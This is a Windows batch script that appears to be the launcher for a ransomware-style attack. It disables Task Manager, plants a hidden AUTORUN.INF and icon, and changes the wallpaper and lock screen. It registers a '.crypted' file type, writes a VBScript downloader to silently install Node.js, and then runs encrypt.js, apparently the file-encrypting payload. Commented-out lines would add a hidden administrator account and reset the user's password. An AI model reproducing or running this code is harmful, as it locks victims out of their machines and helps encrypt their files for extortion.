@echo off

rem lock of taskmgr
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 00000001 /f
rem reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 00000000 /f

rem change system driver ico
if exist "%SystemDrive%\520.ico" del /f /q /ah %SystemDrive%\520.ico 
copy "%~dp0\520.ico" %SystemDrive%\520.ico
if exist %SystemDrive%\AUTORUN.INF del /f /q /ah %SystemDrive%\AUTORUN.INF
echo [Autorun]    >> %SystemDrive%\AUTORUN.INF
echo icon=520.ico >> %SystemDrive%\AUTORUN.INF
ATTRIB +H %SystemDrive%\520.ico
ATTRIB +H %SystemDrive%\AUTORUN.INF

rem run change lock screen picture
if exist "%~dp0\百变锁屏.exe" copy "%~dp0\百变锁屏.exe" %appdata%\百变锁屏.exe
if exist %appdata%\百变锁屏.exe start %appdata%\百变锁屏.exe

rem shutdown when log in
rem echo echo off>run.bat
rem echo. 
rem echo shutdown /g>>run.bat
rem copy run.bat "%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup" > nul
rem del run.bat > nul
rem call "%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup\run.bat" > nul

rem lock computer username
rem net user jiaqq123456 123 /add
rem net localgroup administrators jiaqq123456 /add
rem net user %username% 789
rem net user jiaqq123456789 /delete

rem change desktop picture
reg add "hkcu\control panel\desktop" /v "wallpaper" /d "%~dp0\Wallpaper.jpg" /f

rem add crpted files ico
@assoc .crypted=crypted
@reg add HKEY_CLASSES_ROOT\crypted\DefaultIcon /ve /d "%~dp0\520.ico" /f

rem prepare to deploy
if not exist "%SystemDrive%\Program Files\nodejs\node.exe" (goto setup) else goto setupEnd
:setup
if exist "%SystemDrive%\Program Files (x86)" (goto url64) else goto url32
:url64
echo url64
set Url=https://nodejs.org/dist/v10.15.0/node-v10.15.0-x64.msi
goto download
:url32
echo url32
set Url=https://nodejs.org/dist/v10.15.0/node-v10.15.0-x86.msi
goto download
:download
echo start to download
set Save=
for %%a in ("%Url%") do set "FileName=%%~nxa"
if not defined Save set "Save=%cd%"
(echo Download Wscript.Arguments^(0^),Wscript.Arguments^(1^)
echo Sub Download^(url,target^)
echo   Const adTypeBinary = 1
echo   Const adSaveCreateOverWrite = 2
echo   Dim http,ado
echo   Set http = CreateObject^("Msxml2.ServerXMLHTTP"^)
echo   http.open "GET",url,False
echo   http.send
echo   Set ado = createobject^("Adodb.Stream"^)
echo   ado.Type = adTypeBinary
echo   ado.Open
echo   ado.Write http.responseBody
echo   ado.SaveToFile target
echo   ado.Close
echo End Sub)>DownloadFile.vbs
DownloadFile.vbs "%Url%" "%Save%\%FileName%"
ATTRIB +H "%Save%\%FileName%"
del DownloadFile.vbs
goto setupNode
:setupNode
if exist "%SystemDrive%\Program Files (x86)" (goto setup64) else goto setup32
:setup64
echo start to setup64
start /wait "" "%~dp0\node-v10.15.0-x64.msi" /quiet
rem del "%~dp0\node-v10.15.0-x64.msi"
goto setupEnd
:setup32
echo start to setup32
start /wait "" "%~dp0\node-v10.15.0-x86.msi" /quiet
rem del "%~dp0\node-v10.15.0-x86.msi"
goto setupEnd
echo install finish

:setupEnd

rem run main program
rem copy "%~dp0\encrypt.js" "%SystemDrive%\Program Files\nodejs\encrypt.js"
rem copy "%~dp0\Rsa.js" "%SystemDrive%\Program Files\nodejs\Rsa.js"
"%SystemDrive%\Program Files\nodejs\node.exe" encrypt.js

rem refresh system setup
RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters

pause


